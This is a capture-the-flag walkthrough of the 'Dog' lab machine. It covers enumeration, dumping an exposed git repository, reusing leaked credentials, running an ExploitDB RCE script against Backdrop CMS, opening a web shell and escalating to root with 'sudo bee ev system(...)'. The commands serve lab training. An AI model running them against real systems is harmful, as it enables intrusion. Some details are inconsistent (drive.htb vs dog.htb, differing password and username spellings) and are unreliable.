# DOG MACHINE (EASY)

The first thing that we want to do is run an NMAP scan to see what ports are open on the victims network.

### STEP 1: NMAP Scanning

> Run the following command: 	**nmap -sV 10.10.11.58**

After running an NMAP scan, we discover that the machine has an open **SSH** (22/tcp) and **HTTP** (80/tcp) port.

### STEP 2: Adding To Hosts

> Run the following command:	**sudo vim /etc/hosts**

Add the following entry to the bottom of the file:	**10.10.11.58	dog.htb**

### STEP 3: Endpoint Enumeration

Use an Endpoint Enumeration tool to find endpoints available on 10.10.11.58

##### GOBUSTER

> Run the following command:	**gobuster dir -u http://dog.htb -w /usr/share/wordlists/rockyou.txt**

##### DIRSEARCH

> Run the following command: 	**dirsearch -u http://10.10.11.58 -x 404,500**

Using DIRSEARCH, there was a hiddent '.git' folder that was present when enumerating the endpoint...

### STEP 4: GIT REPOSITORY DOWNLOAD

Using the tool, **Git-Dumper**, we can clone the git repository

> Run the following command:	**git-dumper http://10.10.11.58 .git**

### STEP 5: EXAMINE SETTINGS.PHP

When the above process has finished executing, open **settings.php** and examine its contents...

> Run the following command:	**gedit settings.php**

At the top of the file, there is a **$database variable that is of particular importance**...

In the comment above this variable, it said to 'see the advanced database documentation at https://api.backdropcms.org/database-configuration'.

As an extract, note the following 

> Most Backdrop sites have a single MySQL database to which they
> connect. 
> 
> If your site only needs to connect to a single database, it should be
> able to use the simple database configuration string at the top of the
> default settings.php file:	
> 
> $database = 'mysql://user:pass@hostname/database_name';
> $database_prefix = '';
> 
> Replace 'user', 'pass', 'hostname', and 'database_name' with the
> applicable information from your server

### STEP 6: Login using found credentials

In the settings.php file, we found the following credentials:
	
	user:	root
	pass:	BackDropJ2024DS2024
	
If we navigate to the login endpoint for this webpage, http://dog.htb/?q=user/login, and try to use the credentials above, we'll get an error that it is an unknown user..

Going back to the repository we clone, we need to search for alternative credentials:

> Run the following command in the repository that was cloned in step 4:	grep -r dog.htb

After execution of this command, it should be found there is a user called 'tiffany'.

Navigate back to the login URL, and try using tiffany as the username and the same password...

SUCCESS!

### STEP 7: Find Backdrop CMS Version to Search for Vulnerability

Once logged in, navigate to Reports->Status Report

Under Backdrop CMS, we find that the version of Backdrop is 1.27.1

Searching on ExploitDB, we note that there is an RCE vulnerability.

Simply download the python script and run it against the dog.htb URL...

> Run the following command: 	python 52021.py http://dog.htb

### STEP 8: Upload Files Generated Through Vulnerability

Still logged in, navigate to Functionality->Install New Modules and on the sidebar click "Manual Installation"...

Once redirected, select "Upload a module, theme, or layout archive to install"...

### STEP 8: Leverage RCE

Navigate to http://drive.htb/modules/shell/shell.php...

> Run the following command: **cat /etc/passwd | grep bash**

We are ideally looking to capitalise on SSH, since we initially found that port was open in our NMAP scan...

There are three users that have bash access: 	root, jobert, johncusack

### STEP 10: Logging in via SSH

In a command prompt, we need to check to see whether the password we found originally works for any of these users...

It was found using the password, BackDRopJ2024DS2024, works for account johncusak@dog.htb

> Type the following command to get user.txt: 	**cat user.txt**

##**strong text**# STEP 11: Obtaining root.txt

When running, sudo -l (to list sudo permissions), we have the ability to run the command "bee"...

> Type the following: cd /var/www/html && sudo bee ev "system('cat /root/root.txt')"


